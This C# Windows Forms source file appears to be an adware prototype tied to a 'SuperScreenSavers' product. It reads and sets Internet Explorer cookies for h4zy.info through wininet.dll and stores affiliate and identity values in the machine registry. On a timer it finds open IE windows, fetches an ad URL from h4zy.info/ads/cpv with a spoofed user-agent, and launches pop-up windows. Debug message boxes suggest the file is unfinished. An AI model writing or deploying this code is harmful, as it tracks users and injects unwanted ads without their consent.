using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace heaven
{
    public partial class Form1 : Form
    {       

        // cookie get/set
        [DllImport("wininet.dll", SetLastError = true)]
        public static extern bool InternetGetCookie(
          string url, string cookieName, StringBuilder cookieData, ref int size);

        [DllImport("wininet.dll", EntryPoint = "InternetSetCookie", ExactSpelling = false, CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool InternetSetCookie(string url, string cookieName, string cookieData);

        static System.Windows.Forms.Timer myTimer = new System.Windows.Forms.Timer();
        static int alarmCounter = 1;
        static bool exitFlag = false;

        // grab cookies from IE
        private static CookieContainer GetUriCookieContainer(Uri uri)
        {
            CookieContainer cookies = null;

            // Determine the size of the cookie
            int datasize = 256;
            StringBuilder cookieData = new StringBuilder(datasize);

            if (!InternetGetCookie(uri.ToString(), null, cookieData,
              ref datasize))
            {
                if (datasize < 0)
                    return null;

                // Allocate stringbuilder large enough to hold the cookie
                cookieData = new StringBuilder(datasize);
                if (!InternetGetCookie(uri.ToString(), null, cookieData,
                  ref datasize))
                    return null;
            }

            if (cookieData.Length > 0)
            {
                cookies = new CookieContainer();
                cookies.SetCookies(uri, cookieData.ToString().Replace(';', ','));
            }
            return cookies;
        }

        // This is the method to run when the timer is raised.
        private static void TimerEventProcessor(Object myObject,
                                                EventArgs myEventArgs)
        {
            myTimer.Stop();

            // Displays a message box asking whether to continue running the timer.
            if (MessageBox.Show("Continue running?", "Count is: " + alarmCounter,
               MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                // Restarts the timer and increments the counter.
                alarmCounter += 1;
                myTimer.Enabled = true;
                checkIE();
            }
            else
            {
                // Stops the timer.
                exitFlag = true;
            }
        }

        // look in registry for cookies
        // if not there look in browser
        // if host_id is not set -- issue http request to grab hostid
        // reset in browser
        void get_or_set_cookies() {
            Uri siteUri = new Uri("http://h4zy.info/");
            RegistryKey masterKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\SuperScreenSavers\\Preferences");

            string AffiliateID = masterKey.GetValue("AffiliateID").ToString();
            string identity = masterKey.GetValue("identity").ToString();

            //InternetGetCookie("http://h4zy.info", "AffiliateID", AffiliateID, ref 256);
            CookieCollection cookies = null;
            //CookieCollection cookies = GetUriCookieContainer(siteUri).GetCookies(siteUri);
            if (cookies != null)
            {
                foreach (Cookie cook in cookies)
                {
                    //AffiliateID, identity
                    //MessageBox.Show(cook.Value, cook.Name);
                    masterKey.SetValue(cook.Name, cook.Value);
                }
            }

            InternetSetCookie("http://h4zy.info", null, "TestData = Test; expires = Sat,01-Jan-2020 00:00:00 GMT");
            InternetSetCookie("http://h4zy.info", null, "TestData2 = Test2; expires = Sat,01-Jan-2020 00:00:00 GMT");
        }

        public Form1()
        {
            InitializeComponent();

            get_or_set_cookies();

            myTimer.Tick += new EventHandler(TimerEventProcessor);

            // Sets the timer interval to 10 seconds.
            myTimer.Interval = 10000;
            myTimer.Start();

            // Runs the timer, and raises the event.
            while (exitFlag == false)
            {
                // Processes all the events in the queue.
                Application.DoEvents();
            }
            //Application.Exit();
            myTimer.Stop();
            Environment.Exit(0);
        }

        private static void checkIE()
        {
            string filename;
            string popurl="";

            SHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindows(); // now uses interface on RHS
            foreach (SHDocVw.InternetExplorer ie in shellWindows)
            {
                filename = Path.GetFileNameWithoutExtension(ie.FullName).ToLower();

                if (filename.Equals("iexplore"))
                {
                    MessageBox.Show(ie.LocationURL, ie.LocationURL);

                    WebClient client = new WebClient();

                    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

                    Stream data = client.OpenRead("http://h4zy.info/ads/cpv");
                    StreamReader reader = new StreamReader(data);
                    popurl = reader.ReadToEnd();
                    data.Close();
                    reader.Close();

                    //GetUrlFromIE
                    // pop a window to yahoo from ie
                    System.Diagnostics.Process.Start("IEXPLORE.EXE", popurl);
                }
            }

         }

        private void Form1_ResizeBegin(object sender, EventArgs e)
        {
        }

        private void notifyIcon1_DoubleClick(object sender, EventArgs e)
        {
                Show();
                WindowState = FormWindowState.Normal;
         }

        private void Form1_Resize(object sender, EventArgs e)
        {
            if (FormWindowState.Minimized == WindowState)
                Hide();
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            myTimer.Stop();
            exitFlag = false;
            Environment.Exit(0);
        }

        private void Restore_Click(object sender, EventArgs e)
        {
                Show();
                WindowState = FormWindowState.Normal;
         }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            myTimer.Stop();
            exitFlag = false;
            Environment.Exit(0);
        }
    }
}
